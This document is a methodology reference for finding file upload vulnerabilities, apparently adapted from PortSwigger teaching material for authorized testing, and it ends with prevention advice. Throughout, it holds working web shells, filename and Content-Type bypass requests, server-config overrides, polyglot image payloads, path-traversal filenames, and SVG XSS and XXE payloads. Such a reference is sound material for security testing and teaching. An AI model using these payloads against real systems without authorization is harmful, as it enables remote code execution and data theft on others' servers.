# File Upload Vulnerabilities — Reference

Comprehensive methodology for finding and proving file upload vulnerabilities.
Source: https://portswigger.net/web-security/file-upload

Use benign payloads and harmless verification commands (`echo`, `id`) only. Log proven exploits to `./_EXPLOIT/` with a minimal curl repro.

---

## 1. How web servers handle uploaded files

A web server decides what to do with a file largely from its **extension** (and configured handler mappings):

- **Non-executable types** (images, text, HTML): the server returns the file's contents to the client. The `Content-Type` response header tells you how the server interpreted it.
- **Executable types configured to run** (e.g. `.php`, `.jsp`, `.aspx`): the server **executes** the script and returns its output.
- **Executable types NOT configured to run**: usually returned as plain text or an error.

Key questions for any upload:
1. Where does the file land, and at what URL is it served?
2. Is the directory configured to execute scripts?
3. What validation runs, and on which layer (client, Content-Type, extension, content)?

---

## 2. Exploiting unrestricted uploads → web shell RCE

A **web shell** is a malicious script that lets an attacker run arbitrary commands on the server by sending HTTP requests to it. If you can upload a server-side script to an executable path, you get RCE.

Read a file:
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Run a command (parameterised):
```php
<?php echo system($_GET['command']); ?>
```
Then: `GET /uploads/exploit.php?command=id`

**Authorized-testing discipline:** prove RCE with a harmless command only. A self-contained benign PoC:
```php
<?php echo "PoC:"; system("id"); ?>
```
The `id` output (e.g. `uid=33(www-data)`) is sufficient proof. Do not run destructive or data-exfiltrating commands.

---

## 3. Flawed validation: Content-Type header

The multipart part carries a `Content-Type` (e.g. `image/jpeg`). Some servers trust it without inspecting the bytes.

**Bypass:** keep your script's bytes, change the part header to an allowed type:
```
Content-Disposition: form-data; name="file"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>
```

---

## 4. Flawed validation: file extension blacklists

A blacklist rejects known-dangerous extensions. Weaknesses:

### 4a. Insufficient blacklist
Misses alternative executable extensions:
- PHP: `.php`, `.php2`–`.php7`, `.phtml`, `.pht`, `.phar`, `.shtml`
- JSP: `.jsp`, `.jspx`, `.jspf`
- ASP: `.asp`, `.aspx`, `.asa`, `.cer`

### 4b. Case sensitivity
`exploit.pHp` passes a case-sensitive blacklist but executes on a case-insensitive handler.

### 4c. Overriding server config (very powerful)
Many servers allow per-directory config files. If you can upload one, you can make a benign-looking extension executable.

Apache `.htaccess`:
```apache
AddType application/x-httpd-php .l33t
```
Now upload `shell.l33t` (passes any `.php` blacklist) and it runs as PHP.

IIS `web.config`:
```xml
<staticContent>
  <mimeMap fileExtension=".l33t" mimeType="application/x-httpd-php" />
</staticContent>
```

### 4d. Obfuscating the extension
- **Multiple extensions:** `exploit.php.jpg` — exploited when validation/handler disagree on which extension counts.
- **Trailing characters:** `exploit.php.`, `exploit.php ` (space) — stripped after the check on some systems.
- **URL encoding:** `exploit%2Ephp` — passes a literal-dot check but decodes server-side.
- **Semicolon:** `exploit.asp;.jpg` — some C/C++-based stacks truncate at `;`.
- **Null byte:** `exploit.asp%00.jpg` / `exploit.php%00.jpg` — truncates at the null byte in languages with C string handling.
- **Multibyte / Unicode:** sequences such as `0xC0 0xAE` may normalise to `.` and bypass naive filters.
- **Non-recursive stripping:** if the filter strips `.php` once from `exploit.p.phphp`, the result is `exploit.p.php` — still executable. Try repeated/nested patterns.

Combine techniques: `exploit.php.jpg`, `exploit.pHp;.jpg`, etc.

---

## 5. Flawed validation of file contents (magic bytes)

Stronger validation inspects intrinsic content — e.g. a JPEG starts with `FF D8 FF`, a GIF with `GIF87a`/`GIF89a`, a PNG with `89 50 4E 47`.

**Bypasses:**
- **Magic-byte prefix:** prepend a valid signature so the file passes the sniff while the appended script still executes:
  ```
  GIF89a;
  <?php system($_GET['command']); ?>
  ```
- **Polyglot files:** craft a file that is simultaneously a valid image and a valid script. ExifTool can embed PHP in image metadata (e.g. the comment field) while keeping a valid image structure:
  ```bash
  exiftool -Comment='<?php echo "PoC:"; system("id"); ?>' input.jpg -o polyglot.php.jpg
  ```

---

## 6. Uploading to unexpected places via path traversal

If the server uses the client-supplied `filename` to build the storage path without sanitising it, use directory traversal to escape the (possibly non-executable) upload directory:
```
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/exploit.php"
```
Try encoded variants if `../` is filtered: `..%2f`, `..%252f`, `....//`. Goal: land the file in a directory that executes scripts or in a web-served path.

---

## 7. Race conditions

Some apps upload to a temp location, validate, then move or delete the file. There may be a window where the file is present and reachable before validation completes.

- **Classic race:** repeatedly request the temp URL while uploading; execute it during the window before deletion.
- **Widen the window:** append large padding so chunked processing takes longer.
- **URL-based uploads:** when the server fetches a file from a URL into a randomly named dir (e.g. PHP `uniqid()`), the name space may be brute-forceable; larger files extend processing time and the race window.

---

## 8. Uploading via PUT

If the server allows HTTP `PUT`, you may write files directly:
```http
PUT /uploads/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 47

<?php echo "PoC:"; system("id"); ?>
```
Discover support with an `OPTIONS` request and check the `Allow` header.

---

## 9. Client-side attacks (no RCE needed)

When you cannot execute server-side code, uploaded files served from the application origin can still be dangerous.

- **SVG XSS:** SVG is XML and can carry script. If served inline with an HTML/SVG content type from the app origin:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
  ```
- **HTML upload:** an uploaded `.html` served same-origin runs arbitrary script → stored XSS.
- **XXE:** if the server parses uploaded XML / SVG / Office (`.docx`, `.xlsx`) files, test for XML External Entity injection (file read, SSRF):
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]>
  <r>&x;</r>
  ```
- **SSRF:** image/document processors (ImageMagick, headless renderers) or URL-import features may fetch attacker-controlled URLs.

Only report client-side findings that run in a **victim** context (cross-user / authenticated), not self-XSS.

---

## 10. Prevention (for triage / remediation notes)

- Use an extension **whitelist**, not a blacklist.
- Validate the actual content/signature, not just the `Content-Type` header or extension.
- Sanitise filenames; strip directory-traversal sequences; rename files to server-generated names.
- Store uploads outside the web root, or in a directory with script execution disabled.
- Validate in a temporary sandbox before moving to permanent storage; avoid race windows.
- Do not let users upload server config files (`.htaccess`, `web.config`).
- Rely on hardened framework/library upload handling rather than custom parsing.
- Defense in depth: combine all of the above.

---

Reference: https://portswigger.net/web-security/file-upload
